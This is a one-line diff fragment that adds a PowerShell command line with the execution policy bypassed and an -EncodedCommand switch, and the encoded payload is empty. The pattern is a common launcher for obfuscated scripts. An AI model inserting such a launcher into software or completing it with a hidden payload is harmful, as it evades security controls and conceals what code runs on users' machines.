@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -OutputFormat Text -ExecutionPolicy Bypass -EncodedCommand 
